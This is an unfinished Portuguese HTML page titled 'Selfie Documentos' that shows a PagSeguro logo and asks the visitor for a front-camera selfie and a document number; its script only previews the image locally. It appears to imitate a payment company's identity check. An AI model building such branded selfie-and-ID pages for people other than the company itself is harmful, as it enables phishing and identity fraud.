<!DOCTYPE html>
<html lang="pt-br">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="icon" href="/favicon.ico" type="image/x-icon" />
    <link rel="stylesheet" href="./style.css" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap"
      rel="stylesheet"
    />
    <title>Selfie Documentos</title>
    <style>
      #selfie-preview {
        width: 300px; /* Customize the width */
        height: auto;
      }
    </style>
  </head>
  <body>
    <div id="logo-top">
      <img src="./images/logopagseguro.png" alt="" />
      <img src="./images/sinal-de-interrogacao.png" alt="" />
    </div>
    <h1></h1>
    <p></p>
    <input id="selfie" type="file" accept="image/*" capture="user" />
    <img id="selfie-preview" src="" alt="Sua Selfie" />
    <input id="doc" type="text" />
    <button
      style="
        width: 360px;
        height: 40px;
        font-weight: 800;
        border-radius: 20px;
        border: none;
        color: white;
        background-color: var(--cor--azul);
      "
      id="btn-conf-cel"
    >
      Continuar
    </button>
		<script>      document.getElementById('selfie').addEventListener('change', function (e) {
            const file = e.target.files[0];
            const reader = new FileReader();

            reader.onload = function (e) {
                const preview = document.getElementById('selfie-preview');
                preview.src = e.target.result;
            };

            if (file) {
                reader.readAsDataURL(file);
            }
        });</script>
  </body>
</html>
